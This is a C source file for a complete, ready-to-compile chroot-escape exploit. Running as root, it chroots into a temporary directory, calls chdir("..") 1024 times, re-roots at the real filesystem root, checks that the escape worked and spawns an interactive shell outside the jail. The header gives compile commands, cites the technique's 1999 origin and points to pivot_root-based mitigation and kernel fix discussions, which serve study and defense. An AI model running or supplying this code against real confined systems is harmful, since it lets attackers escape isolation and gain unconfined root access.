/*
 * chbreak.c: break out of a chroot as root using the chdir("..") technique
 * by pts@fazekas.hu at Sat Jan  5 12:28:13 CET 2019
 *
 * * Compile with: gcc -static -W -Wall -Wextra -Werror -s -O2 -o chbreak chbreak.c
 * * Also works with pts-xstatic:
 *   xstatic gcc -W -Wall -Wextra -Werror -s -Os -o chbreak chbreak.c
 *
 * * On Linux it's possible to prevent this chdir("..") technique from
 *   working by using pivot_root(2) instead of chroot(2):
 *   https://github.com/vincentbernat/jchroot/blob/3ad09cca4879c27f7eef657b7fa1dd8b4f6aa47b/jchroot.c#L122
 *   The command to use: sudo jchroot /var/mychroot /bin/sh
 *   instead of:         sudo  chroot /var/mychroot /bin/sh
 * * Based on code found here: http://www.ouah.org/chroot-break.html
 *   It also explains how it works. It also says that the technique was
 *   already known in 1999.
 * * Referenced on: https://github.com/vincentbernat/jchroot/issues/1
 * * A proposed fix for chroot(2) to the Linux kernel (2007, not integrated
 *   in 2019): https://lwn.net/Articles/252806/
 * * Related question with useful chroot escape mitigation techniques:
     https://unix.stackexchange.com/q/492607/3054
 * * Related question:
 *   https://unix.stackexchange.com/q/492473/3054
 */

#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

/*
** You should set NEED_FCHDIR to 1 if the chroot() on your
** system changes the working directory of the calling
** process to the same directory as the process was chroot()ed
** to.
**
** It is known that you do not need to set this value if you
** running on Solaris 2.7 and below.
**
*/
#define NEED_FCHDIR 0

#define TEMP_DIR "waterbuffalo"

/* Break out of a chroot() environment in C */

int main(int argc, char **argv) {
  int x;            /* Used to move up a directory tree */
#ifdef NEED_FCHDIR
  int dir_fd;       /* File descriptor to directory */
#endif
  struct stat sbuf, sbuf1, sbuf2;
  (void)argc;

  if (stat("/", &sbuf1) != 0) {
    fprintf(stderr, "Failed to stat1 /: %s\n", strerror(errno));
    exit(1);
  }

/*
** First we create the temporary directory if it doesn't exist
*/
  if (stat(TEMP_DIR,&sbuf)<0) {
    if (errno==ENOENT) {
      if (mkdir(TEMP_DIR,0755)<0) {
        fprintf(stderr,"Failed to create %s - %s\n", TEMP_DIR,
                strerror(errno));
        exit(1);
      }
    } else {
      fprintf(stderr,"Failed to stat %s - %s\n", TEMP_DIR,
              strerror(errno));
      exit(1);
    }
  } else if (!S_ISDIR(sbuf.st_mode)) {
    fprintf(stderr,"Error - %s is not a directory!\n",TEMP_DIR);
    exit(1);
  }

#ifdef NEED_FCHDIR
/*
** Now we open the current working directory
**
** Note: Only required if chroot() changes the calling program's
**       working directory to the directory given to chroot().
**
*/
  if ((dir_fd=open(".",O_RDONLY))<0) {
    fprintf(stderr,"Failed to open \".\" for reading - %s\n",
            strerror(errno));
    exit(1);
  }
#endif

/*
** Next we chroot() to the temporary directory
*/
  if (chroot(TEMP_DIR)<0) {
    fprintf(stderr,"Failed to chroot to %s - %s\n",TEMP_DIR,
            strerror(errno));
    if (geteuid() != 0) {
      fprintf(stderr,
              "Not running as root. Breaking out of chroot works as root.\n");
    }
    exit(1);
  }

#ifdef NEED_FCHDIR
/*
** Partially break out of the chroot by doing an fchdir()
**
** This only partially breaks out of the chroot() since whilst
** our current working directory is outside of the chroot() jail,
** our root directory is still within it. Thus anything which refers
** to "/" will refer to files under the chroot() point.
**
** Note: Only required if chroot() changes the calling program's
**       working directory to the directory given to chroot().
**
*/
  if (fchdir(dir_fd)<0) {
    fprintf(stderr,"Failed to fchdir - %s\n",
            strerror(errno));
    exit(1);
  }
  close(dir_fd);
#endif

/*
** Completely break out of the chroot by recursing up the directory
** tree and doing a chroot to the current working directory (which will
** be the real "/" at that point). We just do a chdir("..") lots of
** times (1024 times for luck :). If we hit the real root directory before
** we have finished the loop below it doesn't matter as .. in the root
** directory is the same as . in the root.
**
** We do the final break out by doing a chroot(".") which sets the root
** directory to the current working directory - at this point the real
** root directory.
*/
  for(x=0;x<1024;x++) {
    chdir("..");
  }
  chroot(".");

  fflush(stdout);
  if (stat("/", &sbuf2) != 0) {
    fprintf(stderr, "Failed to stat2 /: %s\n", strerror(errno));
    exit(1);
  }
  if (sbuf1.st_dev == sbuf2.st_dev && sbuf1.st_ino == sbuf2.st_ino) {
    fprintf(stderr, "Breaking out of the chroot did not work.\n");
    exit(1);
  }
  fprintf(stderr, "Broken out of the chroot.\n");
  fflush(stderr);

/*
** We're finally out - so exec a shell in interactive mode
*/
  {
    DIR *dir = opendir("/");
    struct dirent *e;
    if (!dir) {
      fprintf(stderr, "Failed to opendir /: %s\n", strerror(errno));
      exit(1);
    }
    printf("dir /:\n");
    while ((e = readdir(dir))) {
      printf("%s\n", e->d_name);
    }
    closedir(dir);
  }
  if (!argv[0] || !argv[1] || 0 != strcmp(argv[1], "--no-shell")) {
    fprintf(stderr, "Running interactive shell outside chroot.\n");
    if (execl("/bin/sh","-i",NULL)<0) {
      fprintf(stderr,"Failed to exec - %s\n",strerror(errno));
      exit(1);
    }
  }
  return 0;
}
